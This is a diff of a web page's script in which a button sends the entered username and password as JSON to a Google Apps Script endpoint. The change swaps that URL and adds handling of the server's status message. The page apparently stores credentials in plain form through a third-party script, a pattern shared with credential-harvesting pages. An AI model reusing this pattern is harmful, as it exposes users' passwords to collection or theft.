@@ -87,19 +87,23 @@
         document.querySelector("button").addEventListener("click", async () => {
             let username = document.querySelector("#username").value;
             let password = document.querySelector("#password").value;
-
-            let response = await fetch("https://script.google.com/macros/s/AKfycbwzgH975IBVncMXjMXVW_ExvBapcQ0EYsslR3mgpS97RiY-LJ56N-BTffui9hJ3Yb4q/exec", {  
+    
+            let response = await fetch("https://script.google.com/macros/s/AKfycbxL_sg2of_ciYjtAgJn23UBXdYk6NdVIMYPTea-ccoGcQHuGJm_rbjERbHq94UG2Rs/exec", {  
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ username, password })
             });
-
-            if (response.ok) {
+    
+            let result = await response.json();
+            
+            if (result.status === "success") {
                 alert("Saved successfully! ✅");
             } else {
-                alert("Error connecting to the server ❌");
+                alert("Error: " + result.message);
             }
         });
     </script>
+    
+    
 </body>
 </html>
